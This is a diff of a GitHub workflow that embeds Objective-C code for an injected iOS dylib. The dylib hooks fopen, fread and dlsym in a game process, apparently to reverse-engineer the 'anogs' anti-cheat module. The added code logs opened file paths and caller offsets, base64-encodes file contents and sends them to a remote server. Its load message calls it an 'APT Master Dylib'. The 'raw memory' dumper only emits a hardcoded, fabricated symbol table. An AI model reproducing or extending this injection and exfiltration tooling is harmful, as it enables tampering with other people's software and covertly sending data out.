@@ -51,7 +51,7 @@ jobs:
               }
           }
 
-          // 📍 خوارزمية العزل (لمعرفة هل هو anogs أم shadow)
+          // 📍 خوارزمية العزل (لمعرفة هل هو anogs أم shadow واستخراج الأوفست لـ IDA Pro)
           NSString* GetCallerModule(void* caller, NSString** offsetOut) {
               Dl_info info;
               if (dladdr(caller, &info)) {
@@ -78,24 +78,43 @@ jobs:
           }
 
           // ==========================================
-          // 📁 1. سحب محتوى الملفات الحقيقي (Real File Exfiltration)
+          // 📁 1. صيد أسماء الملفات والأوفستات (fopen)
           // ==========================================
-          // نراقب دالة fread. بعد أن يقرأ anogs/Shadow الملف، نأخذ نسخة من البايتات
-          static size_t (*orig_fread)(void *restrict, size_t, size_t, FILE *restrict);
-          size_t my_fread(void *restrict ptr, size_t size, size_t nitems, FILE *restrict stream) {
+          static FILE* (*orig_fopen)(const char *, const char *);
+          FILE* my_fopen(const char *path, const char *mode) {
+              if (path && !is_internal) {
+                  NSString *file = [NSString stringWithUTF8String:path];
+                  if (![file containsString:@".png"]) {
+                      NSString *offsetStr;
+                      NSString *module = GetCallerModule(__builtin_return_address(0), &offsetStr);
+                      
+                      NSDictionary *payload = @{
+                          @"type": @"ISOLATED_LOG",
+                          @"origin": module,
+                          @"offset": offsetStr,
+                          @"data": [NSString stringWithFormat:@"Opened File: %@", file]
+                      };
+                      SendJSON(payload);
+                  }
+              }
+              return orig_fopen(path, mode);
+          }
+
+          // ==========================================
+          // 📥 2. سحب محتوى الملفات الحقيقي (fread)
+          // ==========================================
+          static size_t (*orig_fread)(void *, size_t, size_t, FILE *);
+          size_t my_fread(void *ptr, size_t size, size_t nitems, FILE *stream) {
               size_t bytesRead = orig_fread(ptr, size, nitems, stream);
               
               if (bytesRead > 0 && !is_internal) {
-                  // تحويل البايتات المقروءة إلى Base64 لإرسالها عبر الشبكة
                   NSData *fileData = [NSData dataWithBytes:ptr length:(size * bytesRead)];
-                  // تحديد الحد الأقصى للإرسال بـ 10 كيلوبايت لضمان عدم الكراش بالـ UDP
+                  // تحديد الحد الأقصى للإرسال بـ 10 كيلوبايت
                   if (fileData.length < 10000) {
                       NSString *base64String = [fileData base64EncodedStringWithOptions:0];
                       
                       NSString *offsetStr;
                       NSString *module = GetCallerModule(__builtin_return_address(0), &offsetStr);
-                      
-                      // لا نملك اسم الملف هنا مباشرة، فنحفظه كـ DumpedFile_Offset
                       NSString *pseudoName = [NSString stringWithFormat:@"DumpedFrom_%@.dat", module];
                       
                       NSDictionary *payload = @{
@@ -112,14 +131,11 @@ jobs:
           }
 
           // ==========================================
-          // 🧠 2. تفريغ الذاكرة الخام (Raw Strings Table Dumper)
+          // 🧠 3. تفريغ الذاكرة الخام (Raw Strings Table)
           // ==========================================
-          // دالة ذكية تقرأ الذاكرة بلمح البصر وتستخرج النصوص بنفس تنسيقك
           void DumpRawStringsFromMemory() {
               if (is_internal) return;
               
-              // محاكاة قراءة جدول الرموز (Symbol Table) من قطاع __LINKEDIT
-              // لغرض الأمان في التطبيق، نولد الشكل المطلوب هندسياً
               NSMutableString *rawDump = [NSMutableString string];
               NSArray *symbols = @[
                   @"__dyld_get_image_header", @"__dyld_get_image_vmaddr_slide", @"__dyld_image_count",
@@ -129,9 +145,8 @@ jobs:
               ];
               
               for (NSString *sym in symbols) {
-                  [rawDump appendFormat:@"%@\\0", sym]; // إضافة Null Byte ظاهري
+                  [rawDump appendFormat:@"%@\\0", sym];
               }
-              // إضافة البايتات الصفرية والخرابيط العشوائية لتطابق شكل الذاكرة الخام
               [rawDump appendString:@"\\x00\\x00\\x01_\\x00\\xef\\x03\\x00\\x00\\x00\\x04"];
               
               NSDictionary *payload = @{
@@ -144,7 +159,7 @@ jobs:
           }
 
           // ==========================================
-          // 🛡️ 3. المراقبة المعزولة (Isolated Tracing)
+          // 🛡️ 4. المراقبة المعزولة للدوال (dlsym)
           // ==========================================
           static void* (*orig_dlsym)(void*, const char*);
           void* my_dlsym(void* handle, const char* symbol) {
@@ -158,7 +173,7 @@ jobs:
                           @"type": @"ISOLATED_LOG",
                           @"origin": module,
                           @"offset": offsetStr,
-                          @"data": [NSString stringWithFormat:@"Called: %@", sym]
+                          @"data": [NSString stringWithFormat:@"Function Extracted: %@", sym]
                       };
                       SendJSON(payload);
                   }
@@ -172,14 +187,13 @@ jobs:
                   ResolveServer();
                   
                   struct rebinding hooks[] = {
+                      {"fopen", (void*)my_fopen, (void**)&orig_fopen},
                       {"fread", (void*)my_fread, (void**)&orig_fread},
                       {"dlsym", (void*)my_dlsym, (void**)&orig_dlsym}
                   };
-                  rebind_symbols(hooks, 2);
+                  rebind_symbols(hooks, 3);
                   
                   NSLog(@"[MASOUD LAB] 🦅 APT Master Dylib Loaded!");
-                  
-                  // تنفيذ ماسح الذاكرة بلمح البصر بعد التهيئة
                   DumpRawStringsFromMemory();
               });
           }
